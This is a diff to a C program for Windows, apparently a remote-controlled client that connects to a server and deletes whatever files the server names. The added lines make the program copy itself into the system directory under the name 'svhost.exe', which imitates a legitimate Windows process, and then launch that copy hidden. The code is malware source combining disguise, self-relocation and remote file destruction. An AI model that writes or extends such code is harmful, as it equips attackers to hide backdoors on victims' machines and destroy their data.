@@ -6,7 +6,9 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <shellapi.h>
 #include <stdio.h>
+#include <string.h>
 #include <stdlib.h>
 
 #pragma comment(lib, "Ws2_32.lib")
@@ -59,6 +61,21 @@ void main() {
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
 	
+	char cur_file[MAX_PATH] = { 0 };
+	GetModuleFileNameA(NULL, cur_file, MAX_PATH);
+	//CreateFileA(cur_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	char new_file[MAX_PATH] = { 0 };
+	GetSystemDirectoryA(new_file, MAX_PATH);
+	strcpy(&(new_file[(int)strlen(new_file)]), "\\svhost.exe");
+
+	if (CopyFileA(cur_file, new_file, 1)) {
+		ShellExecuteA(NULL, "open", new_file, NULL, NULL, 0);
+		exit(0);
+	}
+	//CreateFileA(new_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+
 	if (WSAStartup(MAKEWORD(2, 2), &wsadata)) errors_f(1);	//передача инфы по системе библиотеке/компилятору
 	
 	if (getaddrinfo("localhost", PORT, &hints, &result)) errors_f(2);	//раб-ет как переводчик для сокетов (преобразование различных данных)
@@ -83,8 +100,10 @@ void main() {
 				if (!send(s, "There is no such file", 23, 0)) errors_f(5);
 			}
 			else {
-				DeleteFileA(recvbuf);
-				send(s, "The file has been successfully deleted", 39, 0);
+				if (DeleteFileA(recvbuf))
+					send(s, "The file has been successfully deleted", 39, 0);
+				else
+					send(s, "~err: delete file failed", 25, 0);
 			};
 		}
 		else if (r_bytes == 0) printf("Connecton closed!\n");
